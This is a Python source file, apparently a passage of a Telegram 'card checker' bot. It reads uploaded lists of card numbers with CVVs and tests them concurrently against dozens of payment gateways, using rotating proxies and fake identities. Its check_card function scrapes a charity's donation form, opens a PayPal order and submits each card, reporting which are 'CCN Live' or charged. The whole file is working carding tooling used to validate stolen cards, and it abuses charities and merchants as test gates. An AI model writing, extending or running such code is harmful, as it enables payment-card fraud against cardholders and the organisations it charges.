import re
import requests
import json
import random
import time
import os
import sys
import signal
import asyncio
import telegram
import httpx
import uuid
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from config import BOT_TOKEN, PROXY, GATEWAY_AMOUNTS, REQUEST_TIMEOUT, RETRY_ATTEMPTS, COLOR_RED, COLOR_GREEN, COLOR_GRAY, COLOR_ORANGE, COLOR_RESET
from response_formatter import ApprovalStatus
from bot.core.response_templates import (
    format_single_card_result,
    format_batch_dashboard,
    format_batch_hit,
    format_batch_complete,
    format_start_batch,
    format_progress,
    get_card_brand,
    get_country_flag,
    mask_card
)
from metrics_collector import record_metric, get_summary
from gates.stripe import stripe_check
from gates.woostripe import woostripe_check
from gates.woostripe_auth import woostripe_auth_check
from gates.woostripe_template import woostripe_charge_check
from gates.woostripe_browser import (
    woostripe_browser_auth_async,
    woostripe_browser_charge_1_async,
    woostripe_browser_charge_5_async
)
from gates.madystripe import madystripe_check
from gates.braintree import braintree_check
from gates.paypal_charge import paypal_charge_check
# Phase 1 New Gateways
from gates.stripe_auth_epicalarc import stripe_auth_epicalarc_check
from gates.shopify_nano import shopify_nano_check, shopify_check_from_file
from gates.charge_stripe_wrapper import charge1_check, charge2_check, charge4_check, charge5_check
# charge3_check removed (saintvinson gateway deleted)
from gates.api_gateways import (
    braintree_auth_api_check
)
from gates.stripe_charge import stripe_charge_check
from gates.stripe_charity import gateway_check as stripe_charity_check
from gates.braintree_auth import braintree_auth_check
from gates.braintree_laguna import gateway_check as braintree_laguna_check
from gates.lions_club import lions_club_check
from gates.corrigan_charge import corrigan_check
from gates.texas_charge import texas_check
from gates.shopify_checkout import shopify_checkout_check
from gates.stripe_auth_real import stripe_real_auth_check
from gates.paypal_auth import paypal_auth_check
from gates.braintree_charge import braintree_charge_check
from gates.auto_detect import auto_check as auto_detect_check, detect_platform
from gates.braintree_vkrm import braintree_vkrm_check
from gates.bellalliance_charge import bellalliance_charge_check
from gates.adespresso_auth import adespresso_auth_check
from gates.amex_auth import amex_auth_check
from gates.stripe_verified import (
    foe_check, charitywater_check, donorschoose_check,
    newschools_check, ywca_check
)
from gates.vbv_lookup import lookup_vbv, format_vbv_response
from gates.vkrm_api import vkrm_check
from tools.vbv_api import get_vbv_for_card
from gates.mass_check import (
    mass_check_sync,
    mass_check_async,
    get_available_gates,
    get_gate_info,
    check_single_card
)
from tools.shopify_manager import (
    get_next_shopify_site,
    advanced_shopify_health,
    mark_store_working,
    mark_store_failure,
)
from tools.card_generator import generate_cards, lookup_bin, format_gen_response
from tools.fake_identity import generate_fake_identity, format_fake_response
from tools.shopify_db import (
    init_db, add_store, remove_store, list_stores, get_store_with_products,
    get_random_store_with_product, count_stores, get_stores_to_scan, add_stores_bulk,
    add_stores_bulk_async, list_stores_full,
    cache_card, get_all_cached_cards, remove_cached_card, mark_card_declined, count_cached_cards
)
from tools.stripe_db import add_stripe_sites_bulk, count_stripe_sites, get_valid_stripe_keys
from gates.auto_checkout import auto_checkout_all_cards, extract_stripe_pk
from bot.infrastructure.proxy_pool import (
    proxy_pool, init_proxy_pool, get_next_proxy_from_pool, mark_proxy_failed_in_pool,
    proxy_status, check_proxy, get_proxy_status_emoji
)
from bot.domain.card_utils import (
    normalize_card_input, COUNTRY_FLAGS, get_country_flag, get_card_type_from_bin,
    lookup_bin_info, format_bin_info_extended, detect_security_type
)
from bot.core.keyboards import (
    create_batch_control_keyboard, create_card_button,
    create_main_menu, create_single_gates_menu, create_batch_menu,
    create_settings_menu, create_back_button,
    create_tools_menu, create_ai_menu, create_help_menu, create_paired_menu
)
from bot.services.session_manager import (
    check_numbers, check_status, ongoing_checks, stop_requested,
    document_queue, concurrent_doc_sessions, batch_sessions, MAX_CONCURRENT_DOCS,
    get_next_check_number, register_check, unregister_check, is_check_active,
    request_stop, should_stop, queue_document, get_queued_documents,
    clear_document_queue, get_active_doc_sessions, count_active_sessions,
    prune_completed_sessions, remove_processed_docs
)
from bot.domain.gates import GATE_INFO, get_gate_display, get_gateway_amount
from bot.services.gateway_executor import call_gateway_with_timeout, validate_proxy_before_request
from bot.services.logging_utils import log_gateway_error, log_error_metric
from bot.infrastructure.http_client import create_session, get_random_headers
from bot.handlers.system import create_start_handler, create_cmds_handler, create_menu_handler, create_proxy_handler, create_setproxy_handler, create_metrics_handler
from bot.handlers.utility import create_gen_handler, create_fake_handler, create_chatgpt_handler, create_blackbox_handler, create_extrap_handler, create_stopextrap_handler
from bot.handlers.gateways import (
    create_gateway_handler, create_mass_handler,
    create_single_gateway_handler, create_batch_gateway_handler
)
from bot.handlers.callbacks import create_button_callback_handler
from bot.handlers.shopify import (
    create_shopify_charge_handler,
    create_shopify_auto_handler,
    create_shopify_health_handler,
    create_addstore_handler,
    create_scanstores_handler,
    create_addstores_handler,
    create_handle_store_file,
)
from bot.handlers.scanner import (
    create_categorize_sites_handler,
    create_import_shopify_stores_handler,
    create_import_stripe_sites_handler,
    create_stripe_stats_handler,
)
from bot.infrastructure.lifecycle import register_signal_handlers


async def auto_cache_approved_card(card_num: str, card_mon: str, card_yer: str, card_cvv: str,
                                    gate_name: str, bank_name: str = None, country: str = None) -> str:
    """
    Auto-cache an approved card and return a status message for the response.
    
    SECURITY NOTE: Card caching is DISABLED to comply with PCI-DSS requirements.
    Storing plaintext PAN/CVV data is a security violation.
    This function now returns empty string without caching.
    """
    return ""


async def format_and_cache_response(
    gateway_name: str,
    card_input: str,
    status: ApprovalStatus,
    message: str = "No response",
    elapsed_sec: float = 0.0,
    security_type: str = "Unknown",
    vbv_status: str = "Failed",
    proxy_alive: bool = True,
    bank_name: str = "Unknown",
    country: str = "Unknown",
    amount_usd: float = 0.01
) -> str:
    """
    Centralized async wrapper that formats the response AND auto-caches approved cards.
    Uses format_single_card_result from response_templates.
    """
    status_str = status.value.upper() if hasattr(status, 'value') else str(status).upper()
    
    cvv_match = status != ApprovalStatus.CVV_ISSUE
    ccn_live = status in [ApprovalStatus.APPROVED, ApprovalStatus.CVV_ISSUE, ApprovalStatus.INSUFFICIENT_FUNDS]
    
    card_parts = card_input.split('|')
    card_number = card_parts[0] if card_parts else ""
    card_type = get_card_type_from_bin(card_number) if card_number else "CREDIT"
    
    amount_str = f"${amount_usd:.2f} USD" if amount_usd > 0 else "Free"
    
    formatted = format_single_card_result(
        card_input=card_input,
        status=status_str,
        card_brand=get_card_brand(card_number),
        card_type=card_type,
        bank_name=bank_name,
        country=country,
        cvv_match=cvv_match,
        ccn_live=ccn_live,
        gateway=gateway_name,
        amount=amount_str,
        elapsed_sec=elapsed_sec,
        proxy_alive=proxy_alive
    )
    
    if status == ApprovalStatus.APPROVED:
        parts = card_input.split('|')
        if len(parts) >= 4:
            card_num, card_mon, card_yer, card_cvv = parts[0], parts[1], parts[2], parts[3]
            cache_msg = await auto_cache_approved_card(
                card_num, card_mon, card_yer, card_cvv, 
                gateway_name, bank_name, country
            )
            formatted += cache_msg
    
    return formatted
from tools.shopify_discovery import discover_store_products, scan_store, scan_pending_stores, scan_all_pending_stores
from gates.shopify_auto import shopify_auto_check
from gates.tsa_charge import tsa_check
from gates.corrigan_charge import corrigan_check

# Disable SSL warnings for proxy
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors for console output (now imported from config)
Z = COLOR_RED
F = COLOR_GREEN
GRAY = COLOR_GRAY
ORANGE = COLOR_ORANGE
RESET = COLOR_RESET

# Global storage for uploaded files
uploaded_files = {}

# Store last document per user
last_document = {}

# Background tasks for store operations (non-blocking)
# Format: {user_id: {"task": asyncio.Task, "type": str, "started": float}}
background_store_tasks = {}

# ============================================================================
# SHOPIFY HANDLERS (created via factory functions)
# ============================================================================
# Note: These handlers are created once dependencies are available
# The actual handler creation happens below after process_cards_with_gateway is defined

# Concurrency limiter for mass checks - allows multiple mass checks simultaneously
mass_check_semaphore = asyncio.Semaphore(10)  # Max 10 concurrent card checks per file

# Support for concurrent file checks across multiple gateways
# Format: {f"{user_id}_{check_num}": {"approved": 0, "failed": 0, "status_msg": message_obj, "cards_processed": 0}}
concurrent_file_stats = {}
file_check_semaphore = asyncio.Semaphore(10)  # Max 10 concurrent file checks (allows running Braintree + Stripe etc simultaneously)

# ============================================================================
# CONCURRENT DOCUMENT BATCH PROCESSING
# ============================================================================

async def process_document_batch(
    user_id: int,
    chat_id: int,
    file_path: str,
    filename: str,
    gate_name: str,
    gate_func,
    context,
    session_id: str,
    max_concurrent_cards: int = 15
):
    """
    Process a single document with concurrent card checking.
    This is the core batch processor that handles one file with many cards concurrently.
    """
    import uuid
    
    cards = []
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line or '|' not in line:
                    continue
                parts = line.split('|')
                if len(parts) >= 4 and parts[0].isdigit() and len(parts[0]) >= 13:
                    cards.append(line)
    except Exception as e:
        print(f"[CONCURRENT] Error reading {filename}: {e}")
        return {"error": str(e), "approved": 0, "failed": 0}
    
    if not cards:
        return {"error": "No valid cards found", "approved": 0, "failed": 0}
    
    concurrent_doc_sessions[session_id] = {
        "user_id": user_id,
        "file_path": file_path,
        "filename": filename,
        "gate": gate_name,
        "total": len(cards),
        "processed": 0,
        "approved": 0,
        "failed": 0,
        "stopped": False,
        "completed": False,
        "start_time": time.time()
    }
    
    session = concurrent_doc_sessions[session_id]
    semaphore = asyncio.Semaphore(max_concurrent_cards)
    results_lock = asyncio.Lock()
    
    async def check_card_concurrent(card_data: str):
        if session.get("stopped"):
            return None
        
        async with semaphore:
            if session.get("stopped"):
                return None
            
            try:
                parts = card_data.strip().split('|')
                card_num, card_mon, card_yer, card_cvc = parts[0], parts[1], parts[2], parts[3]
                
                if len(card_yer) == 2:
                    card_yer = f"20{card_yer}"
                
                loop = asyncio.get_event_loop()
                result, proxy_alive = await loop.run_in_executor(
                    None,
                    lambda: gate_func(card_num, card_mon, card_yer, card_cvc, PROXY)
                )
                
                is_approved = False
                if result and "approved" in result.lower() or "charged" in result.lower() or "success" in result.lower():
                    is_approved = True
                elif result and "✅" in result:
                    is_approved = True
                
                async with results_lock:
                    session["processed"] += 1
                    if is_approved:
                        session["approved"] += 1
                    else:
                        session["failed"] += 1
                
                return {
                    "card": card_data,
                    "result": result,
                    "approved": is_approved
                }
                
            except Exception as e:
                async with results_lock:
                    session["processed"] += 1
                    session["failed"] += 1
                return {"card": card_data, "result": f"Error: {str(e)}", "approved": False}
    
    tasks = [check_card_concurrent(card) for card in cards]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    session["completed"] = True
    session["end_time"] = time.time()
    
    valid_results = [r for r in results if r is not None and not isinstance(r, Exception)]
    approved_results = [r for r in valid_results if r.get("approved")]
    
    return {
        "total": len(cards),
        "processed": session["processed"],
        "approved": len(approved_results),
        "failed": session["failed"],
        "approved_cards": [r["card"] for r in approved_results],
        "elapsed": session.get("end_time", time.time()) - session["start_time"]
    }

async def start_concurrent_batch_processing(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE,
    gate_name: str,
    gate_func
):
    """
    Start processing multiple queued documents concurrently.
    Each document runs in its own task with concurrent card checking.
    """
    user_id = update.message.from_user.id
    chat_id = update.message.chat_id
    
    # Prune completed sessions to free up slots
    prune_completed_sessions()
    
    queued_docs = get_queued_documents(user_id)
    if not queued_docs:
        if user_id in last_document:
            file_path = last_document[user_id]['path']
            filename = last_document[user_id]['filename']
            queued_docs = [{"path": file_path, "filename": filename, "gate": gate_name}]
        else:
            await update.message.reply_text(
                "❌ <b>No documents queued!</b>\n\n"
                "Upload text files first, then use <code>/massall</code> to process all.",
                parse_mode='HTML'
            )
            return
    
    active_count = count_active_sessions(user_id)
    if active_count >= MAX_CONCURRENT_DOCS:
        await update.message.reply_text(
            f"⚠️ <b>Max concurrent limit reached!</b>\n\n"
            f"You have {active_count} documents processing.\n"
            f"Wait for some to complete or use <code>/stopall</code> to cancel.",
            parse_mode='HTML'
        )
        return
    
    docs_to_process = queued_docs[:MAX_CONCURRENT_DOCS - active_count]
    
    status_msg = await update.message.reply_text(
        f"🚀 <b>Starting Concurrent Batch Processing</b>\n\n"
        f"📁 Documents: {len(docs_to_process)}\n"
        f"⚡ Gateway: {gate_name}\n"
        f"🔄 Max concurrent cards per doc: 15\n\n"
        f"Processing...",
        parse_mode='HTML'
    )
    
    async def process_single_doc(doc):
        session_id = f"{user_id}_{int(time.time()*1000)}_{random.randint(1000,9999)}"
        result = await process_document_batch(
            user_id=user_id,
            chat_id=chat_id,
            file_path=doc["path"],
            filename=doc["filename"],
            gate_name=gate_name,
            gate_func=gate_func,
            context=context,
            session_id=session_id
        )
        return {"filename": doc["filename"], "result": result, "session_id": session_id}
    
    tasks = [process_single_doc(doc) for doc in docs_to_process]
    all_results = await asyncio.gather(*tasks, return_exceptions=True)
    
    summary_lines = ["<b>📊 Concurrent Batch Complete</b>\n"]
    total_approved = 0
    total_failed = 0
    all_approved_cards = []
    
    for item in all_results:
        if isinstance(item, Exception):
            summary_lines.append(f"❌ Error: {str(item)[:50]}")
            continue
        
        filename = item["filename"]
        result = item["result"]
        
        if "error" in result:
            summary_lines.append(f"❌ <code>{filename}</code>: {result['error']}")
        else:
            approved = result.get("approved", 0)
            failed = result.get("failed", 0)
            total = result.get("total", 0)
            elapsed = result.get("elapsed", 0)
            
            total_approved += approved
            total_failed += failed
            all_approved_cards.extend(result.get("approved_cards", []))
            
            status_emoji = "✅" if approved > 0 else "📁"
            summary_lines.append(
                f"{status_emoji} <code>{filename}</code>: "
                f"✅{approved} ❌{failed} ({total} total) - {elapsed:.1f}s"
            )
    
    summary_lines.append(f"\n<b>Total:</b> ✅ {total_approved} approved | ❌ {total_failed} declined")
    
    if all_approved_cards:
        summary_lines.append(f"\n<b>Approved Cards:</b>")
        for card in all_approved_cards[:10]:
            summary_lines.append(f"<code>{card}</code>")
        if len(all_approved_cards) > 10:
            summary_lines.append(f"... and {len(all_approved_cards) - 10} more")
    
    await status_msg.edit_text("\n".join(summary_lines), parse_mode='HTML')
    
    # Remove only the processed documents from queue, keep the rest
    remove_processed_docs(user_id, len(docs_to_process))
    
    # Prune completed sessions
    prune_completed_sessions()
    
    # Notify if there are remaining documents in queue
    remaining_docs = get_queued_documents(user_id)
    if remaining_docs:
        await update.message.reply_text(
            f"📋 <b>{len(remaining_docs)} documents remaining in queue</b>\n"
            f"Use <code>/massall</code> to continue processing.",
            parse_mode='HTML'
        )


def info_requests():
    """Initialize session with user agent, faker, and retry logic"""
    return create_session(PROXY)


def var_response_msg(us, r):
    """Get form hash, form id, and prefix from donation page"""
    url = "https://www.brightercommunities.org/donate-form/"
    headers = get_random_headers(us)
    
    try:
        response = r.get(url, headers=headers, timeout=20)
        print(f"Response status code: {response.status_code}")
        
        hash_match = re.findall(r'(?<=name="give-form-hash" value=").*?(?=")', response.text)
        form_id_match = re.findall(r'(?<=name="give-form-id" value=").*?(?=")', response.text)
        prefix_match = re.findall(r'(?<=name="give-form-id-prefix" value=").*?(?=")', response.text)
        
        if not hash_match:
            print(f"{Z}[✗] Form hash not found{RESET}")
            return None, None, None
        if not form_id_match:
            print(f"{Z}[✗] Form ID not found{RESET}")
            return None, None, None
        if not prefix_match:
            print(f"{Z}[✗] Form prefix not found{RESET}")
            return None, None, None
            
        print(f"{F}[✓] Form data extracted successfully{RESET}")
        return hash_match[0], form_id_match[0], prefix_match[0]
    except Exception as e:
        print(f"{Z}[✗] Error getting form data: {e}{RESET}")
        return None, None, None

def requests_id(us, r, fake, hash_val, form_id, prefix):
    """Create PayPal order and get order ID"""
    url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
    
    payload = {
        'give-form-id-prefix': prefix,
        'give-form-id': form_id,
        'give-form-minimum': '5.00',
        'give-form-hash': hash_val,
        'give-amount': '5.00',
        'give_first': fake.first_name(),
        'give_last': fake.last_name(),
        'give_email': fake.email()
    }
    
    headers = get_random_headers(us)
    headers['Content-Type'] = 'application/x-www-form-urlencoded'
    
    try:
        response = r.post(url, data=payload, headers=headers, timeout=20)
        response.raise_for_status()  # Raise exception for bad status codes
        
        data = response.json()
        order_id = data.get("data", {}).get("id")
        
        if not order_id:
            print(f"{Z}[✗] Order ID not found in response{RESET}")
            return None
        
        print(f"{F}[✓] Order created with ID: {order_id}{RESET}")
        return order_id
    except requests.exceptions.JSONDecodeError:
        print(f"{Z}[✗] Invalid JSON response from server{RESET}")
        return None
    except Exception as e:
        print(f"{Z}[✗] Error creating order: {e}{RESET}")
        return None

def info_cards(card_num):
    """Determine card type based on first digit"""
    card_types = {
        '3': 'JCB',
        '4': 'VISA',
        '5': 'MASTER_CARD',
        '6': 'DISCOVER'
    }
    return card_types.get(card_num[0], "Unknown")

def check_card(card_num, card_mon, card_yer, card_cvc, proxy=None):
    """Main function to check a card via PayPal
    
    Args:
        card_num: Card number
        card_mon: Card month
        card_yer: Card year
        card_cvc: Card CVC
        proxy: Optional proxy dict to override default PROXY setting
    """
    us, r, fake = info_requests()
    
    # Override proxy if provided
    if proxy is not None:
        r.proxies = proxy
    
    # Get form data
    hash_val, form_id, prefix = var_response_msg(us, r)
    if not hash_val:
        return "Error: Could not get form data", get_proxy_status_emoji()
    
    # Create order
    order_id = requests_id(us, r, fake, hash_val, form_id, prefix)
    if not order_id:
        return "Error: Could not create order", get_proxy_status_emoji()
    
    # Get card type
    info_card = info_cards(card_num)
    
    # PayPal GraphQL request
    url = "https://www.paypal.com/graphql?fetch_credit_form_submit="
    
    payload = {
        "query": """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """,
        "variables": {
            "token": order_id,
            "card": {
                "cardNumber": card_num,
                "type": info_card,
                "expirationDate": f"{card_mon}/20{card_yer}",
                "postalCode": fake.zipcode(),
                "securityCode": card_cvc,
            },
            "phoneNumber": fake.phone_number(),
            "firstName": fake.first_name(),
            "lastName": fake.last_name(),
            "billingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "shippingAddress": {
                "givenName": fake.first_name(),
                "familyName": fake.last_name(),
                "country": "US",
                "line1": fake.street_address(),
                "line2": "",
                "city": fake.city(),
                "state": fake.state_abbr(),
                "postalCode": fake.zipcode(),
            },
            "email": fake.email(),
            "currencyConversionType": "PAYPAL"
        },
        "operationName": None
    }
    
    headers = get_random_headers(us)
    headers['Content-Type'] = 'application/json'
    
    try:
        response = r.post(url, data=json.dumps(payload), headers=headers, timeout=45)
        text_paypal = response.text
        
        # Update proxy status as live since request succeeded
        proxy_status["live"] = True
        proxy_status["checked"] = True
        
        # Parse response
        if "accessToken" in text_paypal or "cartId" in text_paypal:
            return "APPROVED ✅ Charged $5.00", get_proxy_status_emoji()
        elif "INVALID_SECURITY_CODE" in text_paypal:
            return "APPROVED ✅ CVV2 FAILURE (CCN Live)", get_proxy_status_emoji()
        elif "INVALID_BILLING_ADDRESS" in text_paypal:
            return "APPROVED ✅ INSUFFICIENT FUNDS (CCN Live)", get_proxy_status_emoji()
        elif "GRAPHQL_VALIDATION_FAILED" in text_paypal:
            return "DECLINED ❌ GRAPHQL VALIDATION FAILED", get_proxy_status_emoji()
        elif "EXISTING_ACCOUNT_RESTRICTED" in text_paypal:
            return "DECLINED ❌ EXISTING ACCOUNT RESTRICTED", get_proxy_status_emoji()
        elif "RISK_DISALLOWED" in text_paypal:
            return "DECLINED ❌ RISK DISALLOWED", get_proxy_status_emoji()
        elif "ISSUER_DATA_NOT_FOUND" in text_paypal:
            return "DECLINED ❌ ISSUER DATA NOT FOUND", get_proxy_status_emoji()
        elif "R_ERROR" in text_paypal:
            return "DECLINED ❌ CARD GENERIC ERROR", get_proxy_status_emoji()
        elif "ISSUER_DECLINE" in text_paypal:
            return "DECLINED ❌ ISSUER DECLINE", get_proxy_status_emoji()
        elif "EXPIRED_CARD" in text_paypal:
            return "DECLINED ❌ EXPIRED CARD", get_proxy_status_emoji()
        elif "LOGIN_ERROR" in text_paypal:
            return "DECLINED ❌ LOGIN ERROR", get_proxy_status_emoji()
        elif "VALIDATION_ERROR" in text_paypal:
            return "DECLINED ❌ VALIDATION ERROR", get_proxy_status_emoji()
        else:
            # Clean the response for display
            clean_response = text_paypal[:80].replace('<', '').replace('>', '').replace('&', '')
            return f"DECLINED ❌ {clean_response}", get_proxy_status_emoji()
            
    except requests.exceptions.Timeout:
        proxy_status["live"] = False
        proxy_status["checked"] = True
        return "Error: Request timed out", get_proxy_status_emoji()
    except requests.exceptions.ProxyError:
        proxy_status["live"] = False
        proxy_status["checked"] = True
        return "Error: Proxy connection failed", get_proxy_status_emoji()
    except Exception as e:
        proxy_status["checked"] = True
        error_msg = str(e)[:50].replace('<', '').replace('>', '').replace('&', '')
        return f"Error: {error_msg}", get_proxy_status_emoji()

# Telegram Bot Handlers

# Global error handler
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Log errors and handle gracefully"""
    import traceback
    from datetime import datetime
    
    # Log to file
    error_log_path = "logs/bot_errors.log"
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    error_msg = f"\n{'='*80}\n[{timestamp}] ERROR CAUGHT\n{'='*80}\n"
    
    # Add context information
    if update and hasattr(update, 'effective_user') and update.effective_user:
        error_msg += f"User ID: {update.effective_user.id}\n"
    
    if update and hasattr(update, 'effective_chat') and update.effective_chat:
        error_msg += f"Chat ID: {update.effective_chat.id}\n"
    
    if update and hasattr(update, 'message') and update.message:
        error_msg += f"Command: {update.message.text}\n"
    
    error_msg += "\n"
    
    if isinstance(context.error, telegram.error.Forbidden):
        # Bot was kicked/blocked - don't crash
        error_msg += f"Bot access denied: {context.error}\n"
        if update and hasattr(update, 'effective_chat'):
            error_msg += f"Chat ID: {update.effective_chat.id}\n"
        print(f"{Z}[!] Bot was kicked/blocked from a chat. Continuing...{RESET}")
    elif isinstance(context.error, telegram.error.NetworkError):
        error_msg += f"Network error: {context.error}\n"
        print(f"{ORANGE}[!] Network error occurred. Retrying...{RESET}")
    else:
        # Log full traceback for other errors
        error_msg += f"Exception: {context.error}\n"
        error_msg += f"Update: {update}\n"
        error_msg += "\nTraceback:\n"
        error_msg += ''.join(traceback.format_exception(None, context.error, context.error.__traceback__))
        print(f"{Z}[!] ERROR: {context.error}{RESET}")
    
    error_msg += f"{'='*80}\n"
    
    # Write to error log
    with open(error_log_path, 'a', encoding='utf-8') as f:
        f.write(error_msg)
    
    # Try to notify user if possible
    if update and hasattr(update, 'effective_message') and update.effective_message:
        try:
            await update.effective_message.reply_text(
                "⚠️ An error occurred. Please try again or contact support.",
                parse_mode=None
            )
        except Exception:
            pass  # Silently fail if we can't send the message

_colors = {'Z': Z, 'ORANGE': ORANGE, 'RESET': RESET}
start = create_start_handler(check_proxy, lambda: proxy_status, _colors)
cmds_command = create_cmds_handler(_colors)
menu_command = create_menu_handler(lambda: proxy_status)
proxy_command = create_proxy_handler(check_proxy, lambda: PROXY, lambda: proxy_pool)
setproxy_command = create_setproxy_handler(lambda: proxy_pool, init_proxy_pool)
metrics_command = create_metrics_handler(get_summary)

gen_command = create_gen_handler()
fake_command = create_fake_handler()
chatgpt_command = create_chatgpt_handler()
blackbox_command = create_blackbox_handler()
extrap_command = create_extrap_handler(
    get_proxy=lambda: PROXY if PROXY else None,
    gate_functions={
        'stripe': stripe_real_auth_check,
        'paypal': paypal_auth_check,
        'braintree': braintree_laguna_check,
    }
)
stopextrap_command = create_stopextrap_handler()

button_callback = create_button_callback_handler(
    batch_sessions=batch_sessions,
    gateway_amounts=GATEWAY_AMOUNTS,
    get_proxy_status=lambda: proxy_status,
    check_proxy_func=check_proxy,
    get_metrics_summary=get_summary
)


async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /chk command"""
    if not context.args:
        await update.message.reply_text("❌ Please provide a card!\n\nFormat: <code>/chk XXXXXXXXXXXXXXXX|MM|YY|CVV</code>", parse_mode='HTML')
        return
    
    card_input = context.args[0]
    
    # Parse card
    try:
        parts = card_input.split('|')
        if len(parts) != 4:
            await update.message.reply_text("❌ Invalid format!\n\nFormat: <code>XXXXXXXXXXXXXXXX|MM|YY|CVV</code>", parse_mode='HTML')
            return
        
        card_num = parts[0].strip()
        card_mon = parts[1].strip()
        # Convert to 4-digit year: pad with 20 if 2 or fewer digits, otherwise take last 4
        year_str = parts[2].strip()
        card_yer = f"20{year_str.zfill(2)}" if len(year_str) <= 2 else year_str[-4:]
        card_cvc = parts[3].strip()
        
        # Validate
        if not card_num.isdigit() or len(card_num) < 13:
            await update.message.reply_text("❌ Invalid card number!")
            return
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error parsing card: {str(e)}")
        return
    
    # /chk is for single card checking only
    if len(parts) > 4 or ',' in card_input:
        await update.message.reply_text(
            "⚠️ <b>Too many cards for /chk!</b>\n\n"
            "<code>/chk</code> is for single cards only.\n\n"
            "<b>For multiple cards:</b>\n"
            "1️⃣ Upload a text file\n"
            "2️⃣ Use <code>/mass</code> to check all cards",
            parse_mode='HTML'
        )
        return
    
    # Check the card with timing (instant result - no processing message)
    start_time = time.time()
    result, proxy_stat = check_card(card_num, card_mon, card_yer, card_cvc)
    elapsed_sec = round(time.time() - start_time, 2)
    
    # Determine status based on result
    status = ApprovalStatus.DECLINED
    if result and "Error" not in result:
        if any(keyword in result.lower() for keyword in ["charged", "approved", "success", "accesstoken", "cartid"]):
            status = ApprovalStatus.APPROVED
        elif "cvv" in result.lower():
            status = ApprovalStatus.CVV_ISSUE
        elif "insufficient" in result.lower():
            status = ApprovalStatus.INSUFFICIENT_FUNDS
    
    # Lookup BIN info
    bank_name, country = lookup_bin_info(card_num)
    
    # Use centralized formatter with auto-caching
    formatted_response = await format_and_cache_response(
        gateway_name="PayPal",
        card_input=card_input,
        status=status,
        message=result,
        elapsed_sec=elapsed_sec,
        security_type=detect_security_type(result),
        vbv_status="Successful" if status == ApprovalStatus.APPROVED else "Unknown",
        proxy_alive=proxy_status["live"],
        bank_name=bank_name,
        country=country,
        amount_usd=get_gateway_amount('paypal')
    )
    
    await update.message.reply_text(formatted_response, parse_mode='HTML')

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle plain text messages (cards without command)"""
    text = update.message.text.strip()
    
    # Check if it looks like a card
    if '|' in text:
        parts = text.split('|')
        if len(parts) == 4 and parts[0].isdigit():
            # Treat as card
            context.args = [text]
            await check_command(update, context)
            return
    
    await update.message.reply_text("Send a card in format: <code>XXXXXXXXXXXXXXXX|MM|YY|CVV</code>\nOr use <code>/chk card</code>", parse_mode='HTML')

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle document uploads (txt files with card lists) - works in private and group chats"""
    print(f"\n[DEBUG-UPLOAD] ===== DOCUMENT RECEIVED =====")
    print(f"[DEBUG-UPLOAD] Update type: {type(update.message)}")
    print(f"[DEBUG-UPLOAD] Chat type: {update.message.chat.type}")
    print(f"[DEBUG-UPLOAD] Has document: {update.message.document is not None}")
    
    if update.message.document:
        try:
            file_obj = update.message.document
            file = await file_obj.get_file()
            user_id = update.message.from_user.id
            chat_id = update.message.chat_id
            message_id = update.message.message_id
            chat_type = update.message.chat.type  # 'private' or 'group' or 'supergroup'
            
            print(f"[DEBUG-UPLOAD] ✓ Document detected")
            print(f"[DEBUG-UPLOAD] User {user_id}, Chat {chat_id} ({chat_type}), Message {message_id}")
            print(f"[DEBUG-UPLOAD] Filename: {file_obj.file_name}")
            
            # Create directory for storing files
            os.makedirs("uploaded_files", exist_ok=True)
            
            # Use original filename if available, otherwise use file_id
            filename = file_obj.file_name or f"cards_{file.file_id}.txt"
            file_path = f"uploaded_files/user_{user_id}_{filename}"
            
            # Download file
            await file.download_to_drive(file_path)
            print(f"[DEBUG-UPLOAD] ✓ File downloaded to {file_path}")
            
            # Store file path for this user - CRITICAL: Use same structure for both chat types
            last_document[user_id] = {
                'path': file_path,
                'filename': filename,
                'file_obj': file_obj,
                'chat_id': chat_id,
                'message_id': message_id,
                'chat_type': chat_type
            }
            uploaded_files[user_id] = file_path
            
            print(f"[DEBUG-UPLOAD] ✓ Stored: last_document[{user_id}]")
            print(f"[DEBUG-UPLOAD] ✓ Stored: uploaded_files[{user_id}]")
            print(f"[DEBUG-UPLOAD] Keys in last_document: {list(last_document.keys())}")
            print(f"[DEBUG-UPLOAD] Keys in uploaded_files: {list(uploaded_files.keys())}")
            
            # Verify file content and queue for batch processing
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
